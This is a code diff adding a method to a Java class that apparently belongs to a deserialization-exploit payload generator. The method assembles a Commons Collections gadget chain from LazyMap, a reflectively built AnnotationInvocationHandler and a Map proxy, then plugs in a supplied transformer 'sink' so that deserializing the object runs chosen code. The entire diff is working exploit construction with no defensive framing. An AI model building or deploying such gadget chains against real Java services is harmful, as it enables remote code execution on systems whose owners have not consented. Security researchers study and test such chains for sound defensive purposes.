@@ -7,9 +7,35 @@ import org.apache.commons.collections4.keyvalue.TiedMapEntry;
 import org.apache.commons.collections4.map.LazyMap;
 
 import javax.management.BadAttributeValueExpException;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
 import java.util.*;
 
 public class Source4 {
+
+    public static InvocationHandler AnnotationInvocationHandlerSource(SinkResult result) throws Exception {
+        if (result.id == SinkResultID.TemplatesImplNewTransformer) {
+            throw  new IllegalArgumentException("Can't use TemplatesImplNewTransformer as sink");
+        }
+        Transformer fakeTransformers = generateFakeTransformers();
+
+        Map innerMap = new HashMap();
+        innerMap.put("value", 1);
+        Map outerMap = LazyMap.lazyMap(innerMap, fakeTransformers);
+
+        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler obj = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);
+        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, obj);
+        obj = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);
+
+        Reflections.setFieldValue(outerMap, "factory", result.transformer);
+
+        return obj;
+    }
 
     public static PriorityQueue PriorityQueueSource(SinkResult result) throws Exception {
 
